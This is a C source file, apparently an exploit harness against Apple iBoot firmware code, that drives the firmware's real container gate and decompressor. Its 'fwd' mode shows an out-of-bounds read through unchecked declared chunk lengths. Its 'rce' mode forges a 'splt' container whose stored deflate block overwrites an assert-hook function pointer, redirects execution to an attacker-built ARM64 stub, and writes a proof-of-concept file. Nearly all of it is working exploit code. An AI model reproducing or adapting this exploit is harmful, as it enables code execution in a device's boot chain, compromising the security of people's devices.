        for (int i = 0; i < 8; i++) printf(" %02x", *(u8*)(uintptr_t)(cursor+i));
        printf(" magic=%08x\n", rd32((void*)(uintptr_t)cursor));
        GUARDED(g_disp(dst2.payload, dst2.cap, (void*)cursor, w27, scr2.payload, 0x8A1), rc);
        printf("  iter1 (chunk@declen0): ret=%ld faulted=%d\n", rc.ret, rc.faulted);
        if (!rc.faulted) {
          cursor += 0xFFFFFFF0ull;
          GUARDED(g_disp(dst2.payload, dst2.cap, (void*)cursor, w27, scr2.payload, 0x8A1), rc);
          printf("  iter2 (cursor+=declen[1]=0x%08x -> %p): ret=%ld faulted=%d", 0x01000000u, (void*)cursor, rc.ret, rc.faulted);
          if (rc.faulted)
            printf(" sig=%d pc_off=%llx addr=%llx delta_vs_blob=%+lld\n", rc.f.signo,
                   (unsigned long long)(rc.f.pc-(u64)g_fw), (unsigned long long)rc.f.addr,
                   (long long)((long long)rc.f.addr - (long long)cont));
          else printf("\n");
        }
        rmbuf(&dst2); rmbuf(&scr2);
      }
    }
    return 0;
  }

  /* =================== MODE fwd: MISSION 2 forward-cursor axis ==========
   * Loader facts (FUN_0014B580 disasm):
   *   - gate FUN_0014B4B8 only requires blob_size > cnt*4+0x18 (@0x14B50C);
   *     sum(declen[]) is NEVER validated.
   *   - per chunk: disp(dst, cap, cursor, w27=blob_size, scr, algo) @0x14B748,
   *     then cursor += table[i] @0x14B7B8 (u32 add), walk bound hdr+blob_size.
   *   - dispatcher (0xA18/0x8A1/0x891) bounds parsing by the CALLER-supplied
   *     (src, srclen) window only -- no global range gate.
   * => declared lengths drive the SRC CURSOR: a second, independent read
   *    axis. Cells below prove in-bounds forward displacement decodes
   *    attacker-visible adjacent DRAM, and map where rejection begins. */
  if (!strcmp(mode, "fwd")) {
    printf("== FWD: forward src-cursor displacement via declared chunk lengths ==\n");
    /* stage layout: [splt container][gap -> victim bvx1 stream][tail markers] */
    static u8 stage[65536];
    memset(stage, 0xCC, sizeof(stage));

    u8 strmA[8192];
    long lenA = build_stream(strmA, sizeof(strmA), 23 /* benign */);
    /* victim: warm(32) + hostile D=56 whose 8 leaked bytes come from the
     * 8 bytes immediately BEFORE the victim start ("GAPMARK!") */
    u32 Dw[4] = {4,5,4,5};
    u8 vic[4096];
    long v1 = build_bvx1(vic, sizeof(vic), 4, 4, 4, Dw);
    u32 Dh[4] = {56,56,56,56};
    long v2 = build_bvx1(vic + v1, sizeof(vic) - v1, 4, 15, 8, Dh);
    long vlen = v1 + v2;
    wr32(vic + vlen, 0x24787662); vlen += 4;

    struct Cell { const char *tag; u32 F; int place_victim; u32 blob_extra; int algo; };
    struct Cell cells[] = {
      { "F1 fwd-proof   F=512 ", 512,      1, 0,        0x8A1 },
      { "F2 past-window F=4096", 4096,    1, 0,        0x8A1 },
      { "F3 wild       F=~16M ", 0x01000000u, 0, 0,    0x8A1 },
      { "F4 fwd id=0x891 F=512", 512,      1, 0,        0x891 },
    };
    for (unsigned ci = 0; ci < sizeof(cells)/sizeof(cells[0]); ci++) {
      struct Cell *C = &cells[ci];
      if (C->F > sizeof(stage)) { printf("[%s] skipped: F exceeds stage\n", C->tag); continue; }
      memset(stage, 0xCC, sizeof(stage));
      /* THE CONTAINER LIVES IN THE STAGE BUFFER ITSELF */
      size_t dstart = 0x18 + 2*4;                          /* 0x20 */
      u32 dl2[2] = { (u32)lenA, C->F };
      memcpy(stage, "splt", 4);
      wr32(stage + 0x08, 1); wr32(stage + 0x0C, 2);
      wr32(stage + 0x10, 1); wr32(stage + 0x14, 2);
      wr32(stage + 0x18, dl2[0]); wr32(stage + 0x1C, dl2[1]);
      memcpy(stage + dstart, strmA, (size_t)lenA);
      size_t vend = dstart + (size_t)lenA + C->F;          /* cursor after both hops */
      int ok_place = C->place_victim && vend + (size_t)vlen + 16 < sizeof(stage);
      if (ok_place) {
        memcpy(stage + vend, vic, (size_t)vlen);
        /* NOTE: the victim's D-window reads below ITS OWN DST CURSOR
         * (dst-relative backward axis), not around the displaced src.
         * Marker goes in the dst apron right before iter2 instead. */
      }
      u32 clen = (u32)vend + (u32)(ok_place ? vlen : 0) + 64;   /* declared image size */
      if (clen > sizeof(stage)) clen = (u32)sizeof(stage);
      u32 crc = host_crc32(stage + 8, 2*4 + 0x10);
      wr32(stage + 0x04, crc);

      struct R rg;
      GUARDED(g_gate(stage, stage-0x100000, stage+0x1000000, 0, clen), rg);
      printf("[%s] gate(blob=%u): ret=%ld faulted=%d %s\n", C->tag, clen, rg.ret, rg.faulted,
             (!rg.faulted && rg.ret==1) ? "PASS" : "**REJECTED**");
      if (rg.faulted || rg.ret != 1) continue;

      struct lctx lc2; mk_ctx(&lc2, stage, clen, (u32)C->algo);
      u32 w27 = *(u32*)((u8*)&lc2 + 0x48);
      u64 cursor = (u64)(uintptr_t)(stage + dstart);
      struct buf dst2, scr2;
      mkbuf(&dst2, 8192); mkbuf(&scr2, SCRATCH_SZ);
      memset(dst2.payload, 0x11, dst2.cap);
      struct R rc;
      GUARDED(g_disp(dst2.payload, dst2.cap, (void*)cursor, w27, scr2.payload, (u32)C->algo), rc);
      long p1 = rc.faulted ? -1 : rc.ret;
      printf("  iter1 @stage+%llu: ret=%ld faulted=%d\n",
             (unsigned long long)dstart, p1, rc.faulted);
      if (p1 <= 0 || (p1 & 3)) { printf("  iter1 ABORT (loader would panic 0x128)\n"); rmbuf(&dst2); rmbuf(&scr2); continue; }
      cursor += dl2[0];
      printf("  hop +declen0=%u -> cursor@stage+%llu (container data ends @%llu)\n", dl2[0],
             (unsigned long long)(cursor - (u64)(uintptr_t)stage),
             (unsigned long long)(dstart + (size_t)lenA));
      cursor += dl2[1];
      int past = (u64)(uintptr_t)cursor >= (u64)(uintptr_t)stage + dstart + (size_t)lenA;
      printf("  hop +declen1=%u -> cursor@stage+%llu%s\n", dl2[1],
             (unsigned long long)(cursor - (u64)(uintptr_t)stage),
             past ? "  [PAST CHUNK-0 DATA END]" : "");
      if (!ok_place)
        printf("  (no victim placed: cursor reads raw stage tail / unmapped)\n");
      /* dst-relative backward-axis witness: mark the 16B apron below dst_begin */
      memcpy(dst2.payload - 16, "AAAAAAADSTMARK!!", 16);
      GUARDED(g_disp(dst2.payload, dst2.cap, (void*)cursor, w27, scr2.payload, (u32)C->algo), rc);
      if (rc.faulted) {
        printf("  iter2 (decode from displaced cursor): FAULT sig=%d pc_off=%llx addr=%llx\n", rc.f.signo,
               (unsigned long long)(rc.f.pc-(u64)g_fw), (unsigned long long)rc.f.addr);
      } else {
        long p2 = rc.ret;
        printf("  iter2 (decode from displaced cursor): ret=%ld\n", p2);
        if (p2 > 0) {
          int gm = 0; char first8[9] = {0};
          if (p2 >= 55) memcpy(first8, dst2.payload + 47, 8);
          for (long i = 40; i + 7 <= p2; i++)
            if (!memcmp(dst2.payload + i, "GAPMARK", 7)) { gm = 1; break; }
          char safe[9]; for (int i=0;i<8;i++) safe[i]=(first8[i]>=0x20&&first8[i]<0x7f)?first8[i]:'.';
          safe[8]=0;
          printf("  witnesses: src-axis(victim decoded)=ret%ld dst-axis out[47..54]='%s' "
                 "(expect DSTMARK!)\n", p2, safe);
          printf("  out[0..15]: ");
          for (int i = 0; i < 16 && i < p2; i++) printf("%02x", dst2.payload[i]);
          printf("\n");
        }
      }
      rmbuf(&dst2); rmbuf(&scr2);
    }
    return 0;
  }

  /* =================== MODE rce: END-TO-END CONTROL-TRANSFER DEMO =======
   * Geometry (addr == file offset, VA = off + PREFERRED_BASE):
   *   SLOT      = g_fw + 0x3F6638   real iBoot .bss assert-hook slot
   *                                 (setter FUN_001e2ea4 / getter FUN_001e2eb0;
   *                                  consumer FUN_001e5080(0,..) does
   *                                  bl FUN_001e2eb0 ; cbz x0 ; mov x8,x0 ;
   *                                  mov w0,#2 ; adrp/add x1,<str> ; blraaz x8
   *                                  at 0x1E515C)
   *   DST       = SLOT - 24         chunk-dst inside the same reservation
   *   payload   = hdr(5) + filler(16) + ATTACKER_ADDR(8) => stored-block copy
   *               extent == srclen-5 == 24 bytes, fully literal, clean return.
   *   filler lands on [0x3F6628,0x3F6638) -- verified zero-xref bss padding. */
  if (!strcmp(mode, "rce")) {
    printf("== RCE: stored-block smash of REAL _DAT_003f6638 -> firmware blraaz ==\n");
    const u64 SLOT_OFF = 0x3F6638;
    const size_t FILL = 16, PTRN = 8;
    const size_t PAYLOAD = FILL + PTRN;                    /* 24 */
    u8 *slot = g_fw + SLOT_OFF;

    /* attacker executable page (W^X-safe flip) + separate RW marker page */
    u8 *xpage = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    if (xpage == MAP_FAILED) { perror("mmap xpage"); return 1; }
    u8 *mark  = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    if (mark == MAP_FAILED) { perror("mmap mark"); return 1; }
    u64 XA = (u64)(uintptr_t)xpage, MA = (u64)(uintptr_t)mark;

    /* --- emit arm64 canary stub at xpage+0 ---
     *   movz w? no: x16=0x1337 tag ; x17=&marker page
     *   stp x0,x1,[x17] ; stp x2,x3,[x17,#16]
     *   str x30,[x17,#32] ; str x16,[x17,#40] ; brk #0x1337            */
    #define ENC_MOVZ(rd,imm,hw) (0xD2800000u | ((u32)((imm)&0xFFFF))<<5 | ((u32)(hw))<<21 | (rd))
    #define ENCC_MOVK(rd,imm,hw) (0xF2800000u | ((u32)((imm)&0xFFFF))<<5 | ((u32)(hw))<<21 | (rd))
    #define ENC_STP(r1,r2,rn,imm7x8) (0xA9000000u | (((u32)((imm7x8)/8)&0x7F)<<15) | ((u32)(r2))<<10 | ((u32)(rn))<<5 | (r1))
    #define ENC_STR(rt,rn,imm) (0xF9000000u | (((u32)(imm)/8)<<10) | ((u32)(rn))<<5 | (rt))
    #define ENC_BRK(i) (0xD4200000u | ((u32)(i))<<5)
    {
      u32 *c = (u32*)xpage; int k = 0;
      c[k++] = ENC_MOVZ(16, 0x1337, 0);                 /* +0x00 tag        */
      c[k++] = ENC_MOVZ(17, (u16)MA, 0);                /* +0x04 marker lo  */
      c[k++] = ENCC_MOVK(17, (MA>>16)&0xFFFF, 1);
      c[k++] = ENCC_MOVK(17, (MA>>32)&0xFFFF, 2);
      c[k++] = ENCC_MOVK(17, (MA>>48)&0xFFFF, 3);
      c[k++] = ENC_STP(0, 1, 17, 0);                    /* +0x14 log x0,x1  */
      c[k++] = ENC_STP(2, 3, 17, 16);                   /* +0x18 log x2,x3  */
      c[k++] = ENC_STR(30, 17, 32);                     /* +0x1c log lr     */
      c[k++] = ENC_STR(16, 17, 40);                     /* +0x20 magic tag  */
      c[k++] = ENC_BRK(0x1337);                         /* +0x24 STOP, pc proof */
      __builtin___clear_cache((char*)xpage, (char*)xpage + 0x40);
      mprotect(xpage, 0x4000, PROT_READ|PROT_EXEC);
    }

    for (int rep = 1; rep <= 3; rep++) {
      printf("\n--- RCE run %d/3 ---\n", rep);
      memset(mark, 0, 0x1000);
      *(volatile u64*)(g_fw + SLOT_OFF) = 0;            /* reset slot to boot state */
      u64 before = *(volatile u64*)(g_fw + SLOT_OFF);

      /* deflate raw stream: BFINAL=1 BTYPE=00 LEN=FFFF NLEN=FFFF + literal body */
      u8 strm[64]; size_t so = 0;
      strm[so++] = 0x01; strm[so++] = 0xFF; strm[so++] = 0xFF; strm[so++] = 0x00; strm[so++] = 0x00;
      static const u8 fillpat[16] = {'R','C','E','P','A','D','0','1','R','C','E','P','A','D','0','2'};
      memcpy(strm + so, fillpat, FILL); so += FILL;
      memcpy(strm + so, &XA, PTRN);     so += PTRN;
      /* claimed blob size = 29: real gate accepts (29 > cnt*4+0x18 = 28) AND the
       * loader's dispatcher window becomes exactly the 29-byte stream => stored-
       * block copy extent = 29-5 = 24 bytes, ending on slot+8. Physical container
       * keeps normal padding (never parsed). */
      u32 BLOB_CLAIM = (u32)so;
      u32 dl[1] = { (u32)so };
      struct splt_spec sp = { 0xC0FFEE01, 0xDEADC0DE, 1, dl, 1, strm, so };
      static u8 cont[512];
      long clen = build_splt(cont, sizeof(cont), &sp, 0);  /* forged-'splt', CRC32 discipline */

      printf("  geometry: slot=%p (fw+%llx) dst=%p pad=%zu payload=%zu attacker=%p\n",
             (void*)slot, (unsigned long long)SLOT_OFF, (void*)(slot-FILL), FILL, PAYLOAD, (void*)XA);
      printf("  stream: slen=%zu body=%zu [hdr 01 FFFF 0000 | %dB 'RCEPAD' filler | 8B ptr LE]\n",
             so, so-5, (int)FILL);
      printf("  container: phys_len=%ld crc=%08x cnt=1 declen0=%u blob_claim(w27)=%u\n",
             clen, rd32(cont+4), dl[0], BLOB_CLAIM);
      { char p[128]; snprintf(p, sizeof(p), "/tmp/ds_iboot/poc_rce.bin");
        FILE *f = fopen(p, "wb"); fwrite(cont, 1, (size_t)clen, f); fclose(f);
        printf("  poc written: %s (%ldb)\n", p, clen); }

      /* STEP 1 - REAL gate (size claim = BLOB_CLAIM) */
      struct R rg;
      GUARDED(g_gate(cont, cont-0x100000, cont+0x1000000, 0, BLOB_CLAIM), rg);
      printf("  [1] gate FUN_0014b4b8 : ret=%ld faulted=%d -> %s\n", rg.ret, rg.faulted,
             (!rg.faulted && rg.ret==1) ? "ACCEPT" : "**REJECTED**");
      if (rg.faulted || rg.ret != 1) continue;

      /* STEP 2 - loader-faithful chunk walk -> REAL dispatcher id 0x205
       * (ctx+0x48 = w27 window = BLOB_CLAIM; cursor = hdr+0x18+cnt*4) */
      struct lctx lc; mk_ctx(&lc, cont, BLOB_CLAIM, 0x205);
      u32 w27 = *(u32*)((u8*)&lc + 0x48);
      u64 cursor = (u64)(uintptr_t)(cont + 0x18 + 1*4);
      u8 *dst = slot - FILL;
      struct buf scr; mkbuf(&scr, SCRATCH_SZ);
      memset(mark, 0, 0x1000);
      struct R rc;
      GUARDED(g_disp(dst, 0x1000, (void*)cursor, w27, scr.payload, 0x205), rc);
      int wok = !rc.faulted && rc.ret == (long)PAYLOAD;
      printf("  [2] disp FUN_001eb3c8 id=0x205: ret=%ld faulted=%d (want %zu) -> %s\n",
             rc.ret, rc.faulted, PAYLOAD, wok ? "CLEAN-WRITE" : "**BAD**");
      rmbuf(&scr);
      u8 dumpwin[40]; memcpy(dumpwin, (void*)(slot-16), 40);
      printf("      mem[slot-16 .. slot+24]:\n        ");
      for (int i = 0; i < 40; i++) {
        printf("%02x", dumpwin[i]); if (i == 15 || i == 31) printf("\n        ");
      }
      printf("\n");
      u64 after = *(volatile u64*)(g_fw + SLOT_OFF);
      printf("      slot _DAT_003f6638: before=%llx after=%llx %s (attacker=%llx)\n",
             (unsigned long long)before, (unsigned long long)after,
             after == XA ? "== ATTACKER_ADDR" : "**MISMATCH**", (unsigned long long)XA);
      int fillok = !memcmp((void*)(slot-FILL), fillpat, FILL);
      printf("      filler bytes @slot-16: %s ('RCEPAD' literal)\n", fillok ? "VERIFIED" : "**MISMATCH**");
      if (after != XA) continue;

      /* STEP 3 - REAL iBoot validator invokes the smashed hook:
       *   FUN_001e5080(0, out) -> param_1==0 path -> bl FUN_001e2eb0
       *   -> cbz x0(nonzero) -> mov w0,#2 ; x1=&"sysconfig is NULL" ; blraaz x8 */
      typedef long (*fn_val)(long, void*);
      fn_val validator = (fn_val)(g_fw + 0x1E5080);
      u64 outbuf[4] = {0};
      struct R rv;
      printf("  [3] calling REAL FUN_001e5080(0,out): expect blraaz x8=attacker\n");
      GUARDED(validator(0, outbuf), rv);
      printf("      validator: ret=%ld faulted=%d sig=%d pc=%llx (pc_off=%lld)\n",
             rv.ret, rv.faulted, rv.f.signo,
             (unsigned long long)rv.f.pc,
             rv.faulted ? (long long)(rv.f.pc - (u64)g_fw) : -1LL);
      printf("      regs@fault: x0=%llx x1=%llx x2=%llx x3=%llx lr=%llx\n",
             (unsigned long long)rv.f.r[0], (unsigned long long)rv.f.r[1],
             (unsigned long long)rv.f.r[2], (unsigned long long)rv.f.r[3],
             (unsigned long long)rv.f.r[4]);
      int in_xpage = (rv.f.pc >= XA && rv.f.pc < XA + 0x4000);
      u64 mk_tag = *(volatile u64*)(mark + 40);
      u64 m_x0 = *(volatile u64*)(mark), m_x1 = *(volatile u64*)(mark+8);
      u64 m_lr = *(volatile u64*)(mark + 32);
      printf("      marker page: tag=%llx (want 1337) x0=%llx x1=%llx lr_off=%lld\n",
             (unsigned long long)mk_tag, (unsigned long long)m_x0,
             (unsigned long long)m_x1,
             (m_lr > (u64)g_fw && m_lr < (u64)g_fw+g_fw_sz) ? (long long)(m_lr-(u64)g_fw) : -1LL);
      const char *fwstr = (const char*)(g_fw + 0x2A52EF);   /* x1 target string */
      printf("      fw string @fw+2a52ef (x1 arg): '%.24s'\n", fwstr);
      int ok = rv.faulted && rv.f.signo == SIGTRAP && in_xpage &&
               rv.f.pc == XA + 0x24 && mk_tag == 0x1337 &&
               m_x0 == 2 && m_lr == (u64)g_fw + 0x1E5160;
      printf("  VERDICT run%d: %s%s%s%s%s\n", rep,
             in_xpage ? "PC-IN-ATTACKER-PAGE " : "PC-MISS ",
             (rv.f.pc == XA + 0x24) ? "PC==CANARY_BRK " : "pc!=brk ",
             (mk_tag == 0x1337) ? "CANARY-EXECUTED " : "canary-NOT-run ",
             (m_x0 == 2) ? "FW-ARGS-VISIBLE " : "args-missing ",
             (m_lr == (u64)g_fw + 0x1E5160) ? "LR==IBOOT_RET_SITE" : "lr!=iboot");
      if (ok) printf("  >>> CONTROL-TRANSFER PROVEN (rep %d)\n", rep);
      fflush(stdout);
    }
    munmap(xpage, 0x4000); munmap(mark, 0x1000);
    printf("\n== RCE demo complete (3 deterministic runs expected above) ==\n");
    return 0;
  }

  /* =================== MODE full: attempt REAL FUN_0014B580 ============ */
  if (!strcmp(mode, "full")) {
    printf("== attempt REAL loader FUN_0014B580 end-to-end ==\n");
    static u64 lkarena[0x800];
    *(u64*)(g_fw + 0x382DB0) = (u64)lkarena;                 /* lock cur */
    *(u64*)(g_fw + 0x382DB8) = (u64)lkarena;                 /* lock lo  */
    *(u64*)(g_fw + 0x382DC0) = (u64)(lkarena + 0x800);       /* lock hi  */
    static u64 fakelist[8];
    memset(fakelist, 0, sizeof(fakelist));
    *(u64*)(g_fw + 0x3EF5E0) = (u64)fakelist;                /* region-list head */

    printf("  seeded: lock-stack cur/lo=%p hi=%p head[0x3ef5e0]=%p\n",
           (void*)lkarena, (void*)(lkarena+0x800), (void*)fakelist);

    u8 strm[8192];
    long slen = build_stream(strm, sizeof(strm), 23);
    u32 dl[1] = { (u32)slen };
    struct splt_spec sp = { 0xAABBCCDD, 0xDEADBEEF, 1, dl, 1, strm, (size_t)slen };
    static u8 cont[16384];
    long clen = build_splt(cont, sizeof(cont), &sp, 0);
    struct lctx lc; mk_ctx(&lc, cont, (size_t)clen, 0x8A1);

    struct R r;
    GUARDED(g_loader(&lc, &lc, (u8*)&lc + 0x100000, 0), r);
    printf("loader: ret=%ld faulted=%d", r.ret, r.faulted);
    if (r.faulted)
      printf(" sig=%d pc_off=%llx addr=%llx", r.f.signo,
             (unsigned long long)(r.f.pc-(u64)g_fw), (unsigned long long)r.f.addr);
    printf("\n");
    if (r.faulted) {
      long d = (long)(r.f.pc - (u64)g_fw);
      if (d >= 0x17CB08 && d < 0x17CC00) printf("  died IN lock-stack tracker FUN_0017cb08\n");
      else if (d >= 0x1B02A4 && d < 0x1B0360) printf("  died IN iBoot mutex FUN_001b02a4 (tpidrro_el0/SVC platform facility)\n");
      else if (d >= 0x36F70 && d < 0x36F78) printf("  died AT SupervisorCall FUN_00036f70 (mutex slowpath)\n");
      else if (d >= 0x1B0008 && d < 0x1B0100) printf("  died IN allocator FUN_001b0008 (empty free lists)\n");
      else if (d >= 0x1DC178 && d < 0x1DC700) printf("  died IN checked-copy/init FUN_001dc178 family\n");
      else if (d >= 0x7E6B0 && d < 0x7E700) printf("  firmware panic FUN_0007e6b8 fired\n");
      else if (d >= 0x1DE600 && d < 0x1DE620) printf("  firmware panic FUN_001de608 fired\n");
      else if (d >= 0x1EB3C8) printf("  reached DISPATCHER!\n");
      else printf("  death elsewhere (pc_off=%llx)\n", (unsigned long long)d);
    }
    return 0;
  }

  fprintf(stderr, "unknown mode %s\n", mode);
  return 2;
}
